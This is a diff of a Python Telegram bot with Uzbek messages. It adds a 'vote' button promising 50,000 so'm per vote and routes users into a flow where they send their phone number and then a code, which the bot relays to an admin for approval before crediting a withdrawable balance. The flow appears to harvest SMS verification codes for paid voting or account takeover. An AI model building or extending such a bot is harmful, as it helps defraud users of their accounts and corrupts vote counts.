@@ -42,14 +42,17 @@ phone_keyboard = ReplyKeyboardMarkup(
     one_time_keyboard=True
 )
 
+# Foydalanuvchi menyusi - Ovoz berish tugmasi bilan
 user_menu = ReplyKeyboardMarkup(
     keyboard=[
+        [KeyboardButton("🗳️ Ovoz berish")],
         [KeyboardButton("💳 Hamyon"), KeyboardButton("💰 Balans")],
         [KeyboardButton("💸 Yechish")]
     ],
     resize_keyboard=True
 )
 
+# Admin menyusi
 admin_menu = ReplyKeyboardMarkup(
     keyboard=[
         [KeyboardButton("📊 Statistika")],
@@ -199,7 +202,52 @@ async def start(message: types.Message):
         logger.error(f"❌ Start xatosi: {e}")
         await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
 
-# ================= 2. TELEFON RAQAM (Kontakt orqali) =================
+# ================= 2. OVOZ BERISH TUGMASI =================
+@dp.message_handler(lambda msg: msg.text == "🗳️ Ovoz berish")
+async def vote_start(message: types.Message):
+    telegram_id = message.from_user.id
+    logger.info(f"🗳️ Ovoz berish bosildi: {telegram_id}")
+    
+    if telegram_id == ADMIN_ID:
+        await message.answer("👋 Siz adminsiz, /start bosing")
+        return
+    
+    # Foydalanuvchi ro'yxatdan o'tganmi?
+    try:
+        conn = await get_db()
+        user = await conn.fetchrow(
+            "SELECT * FROM users WHERE telegram_id = $1",
+            telegram_id
+        )
+        await conn.close()
+        
+        if user:
+            # Ro'yxatdan o'tgan - yangi ovoz berish uchun telefon raqam so'rash
+            user_states[telegram_id] = "waiting_phone"
+            await message.answer(
+                f"🗳️ <b>OVOZ BERISH</b>\n\n"
+                f"💰 1 ta ovoz = 50 000 so'm\n\n"
+                f"📱 Telefon raqamingizni yuboring:\n"
+                f"(Kontakt tugmasi yoki qo'lda yozing)",
+                reply_markup=phone_keyboard,
+                parse_mode="HTML"
+            )
+        else:
+            # Ro'yxatdan o'tmagan
+            user_states[telegram_id] = "waiting_phone"
+            await message.answer(
+                f"🗳️ <b>OVOZ BERISH</b>\n\n"
+                f"💰 1 ta ovoz = 50 000 so'm\n\n"
+                f"📱 Avval telefon raqamingizni yuboring:\n"
+                f"(Kontakt tugmasi yoki qo'lda yozing)",
+                reply_markup=phone_keyboard,
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        logger.error(f"❌ Ovoz berish xatosi: {e}")
+        await message.answer("❌ Xatolik yuz berdi!")
+
+# ================= 3. TELEFON RAQAM (Kontakt orqali) =================
 @dp.message_handler(content_types=['contact'])
 async def receive_phone_contact(message: types.Message):
     telegram_id = message.from_user.id
@@ -209,7 +257,7 @@ async def receive_phone_contact(message: types.Message):
         return
     
     if user_states.get(telegram_id) != "waiting_phone":
-        await message.answer("❌ Iltimos, /start buyrug'ini bosing!")
+        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
         return
     
     phone = message.contact.phone_number
@@ -217,7 +265,7 @@ async def receive_phone_contact(message: types.Message):
     
     await process_phone(message, phone)
 
-# ================= 3. TELEFON RAQAM (Qo'lda yozish) =================
+# ================= 4. TELEFON RAQAM (Qo'lda yozish) =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
 async def receive_phone_text(message: types.Message):
     telegram_id = message.from_user.id
@@ -281,7 +329,7 @@ async def process_phone(message: types.Message, phone: str):
     except Exception as e:
         logger.error(f"❌ Admin'ga telefon raqam yuborishda xatolik: {e}")
 
-# ================= 4. KODNI QABUL QILISH =================
+# ================= 5. KODNI QABUL QILISH =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
@@ -340,7 +388,7 @@ async def receive_code(message: types.Message):
     
     user_states[telegram_id] = "done"
 
-# ================= 5. ADMIN TASDIQLASH =================
+# ================= 6. ADMIN TASDIQLASH =================
 @dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
 async def admin_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
@@ -376,7 +424,7 @@ async def admin_action(callback: types.CallbackQuery):
                     await bot.send_message(
                         telegram_id,
                         f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
-                        f"Sizning kodingiz tasdiqlandi!\n"
+                        f"Sizning ovozingiz qabul qilindi!\n"
                         f"💰 Hisobingizga <b>+50 000 so'm</b> qo'shildi!\n\n"
                         f"💳 Hamyonni ko'rish uchun pastdagi tugmani bosing",
                         reply_markup=user_menu,
@@ -419,7 +467,8 @@ async def admin_action(callback: types.CallbackQuery):
                 await bot.send_message(
                     telegram_id,
                     "❌ Kechirasiz, siz kiritgan kod noto'g'ri!\n\n"
-                    "Iltimos, telefon raqamingizni qaytadan yuboring: /start"
+                    "Iltimos, qaytadan urinib ko'ring: 🗳️ Ovoz berish",
+                    reply_markup=user_menu
                 )
                 logger.info(f"❌ Foydalanuvchiga rad etish xabari yuborildi: {telegram_id}")
             except Exception as e:
@@ -438,7 +487,7 @@ async def admin_action(callback: types.CallbackQuery):
             logger.error(f"❌ Rad etishda xatolik: {e}")
             await callback.answer("❌ Xatolik yuz berdi!")
 
-# ================= 6. HAMYON / BALANS =================
+# ================= 7. HAMYON / BALANS =================
 @dp.message_handler(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
 async def show_balance(message: types.Message):
     telegram_id = message.from_user.id
@@ -471,7 +520,7 @@ async def show_balance(message: types.Message):
         logger.error(f"❌ Balans xatosi: {e}")
         await message.answer("❌ Balansni olishda xatolik!")
 
-# ================= 7. YECHISH =================
+# ================= 8. YECHISH =================
 @dp.message_handler(lambda msg: msg.text == "💸 Yechish")
 async def withdraw_start(message: types.Message):
     telegram_id = message.from_user.id
@@ -523,7 +572,7 @@ async def withdraw_start(message: types.Message):
         logger.error(f"❌ Yechish xatosi: {e}")
         await message.answer("❌ Xatolik yuz berdi!")
 
-# ================= 8. YECHISH UCHUN TELEFON =================
+# ================= 9. YECHISH UCHUN TELEFON =================
 @dp.message_handler(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_phone")
 async def withdraw_phone(message: types.Message):
     telegram_id = message.from_user.id
@@ -611,7 +660,7 @@ async def withdraw_phone(message: types.Message):
         logger.error(f"❌ Yechish telefon xatosi: {e}")
         await message.answer("❌ Xatolik yuz berdi!")
 
-# ================= 9. ADMIN YECHISH TASDIQLASH =================
+# ================= 10. ADMIN YECHISH TASDIQLASH =================
 @dp.callback_query_handler(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
 async def admin_withdraw_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
@@ -693,7 +742,7 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
             logger.error(f"❌ Yechish rad etishda xatolik: {e}")
             await callback.answer("❌ Xatolik!")
 
-# ================= 10. ADMIN YECHISH SO'ROVLARI =================
+# ================= 11. ADMIN YECHISH SO'ROVLARI =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
 async def withdraw_list(message: types.Message):
     try:
@@ -717,7 +766,7 @@ async def withdraw_list(message: types.Message):
         logger.error(f"❌ Yechish so'rovlari xatosi: {e}")
         await message.answer("❌ Xatolik!")
 
-# ================= 11. ADMIN STATISTIKA =================
+# ================= 12. ADMIN STATISTIKA =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
 async def admin_stats(message: types.Message):
     try:
@@ -745,7 +794,7 @@ async def admin_stats(message: types.Message):
         logger.error(f"❌ Statistika xatosi: {e}")
         await message.answer("❌ Statistika olishda xatolik!")
 
-# ================= 12. KUTAYOTGAN KODLAR =================
+# ================= 13. KUTAYOTGAN KODLAR =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
 async def pending_codes(message: types.Message):
     try:
@@ -770,7 +819,7 @@ async def pending_codes(message: types.Message):
         logger.error(f"❌ Kodlar ro'yxatida xatolik: {e}")
         await message.answer("❌ Kodlar ro'yxatini olishda xatolik!")
 
-# ================= 13. BARCHAGA XABAR =================
+# ================= 14. BARCHAGA XABAR =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
 async def broadcast_start(message: types.Message):
     admin_states[ADMIN_ID] = "waiting_message"
@@ -823,7 +872,7 @@ async def broadcast_send(message: types.Message):
         logger.error(f"❌ Broadcast xatosi: {e}")
         await message.answer("❌ Xabar yuborishda xatolik!")
 
-# ================= 14. BALANS =================
+# ================= 15. BALANS =================
 @dp.message_handler(commands=['balance'])
 async def check_balance(message: types.Message):
     if message.from_user.id == ADMIN_ID:
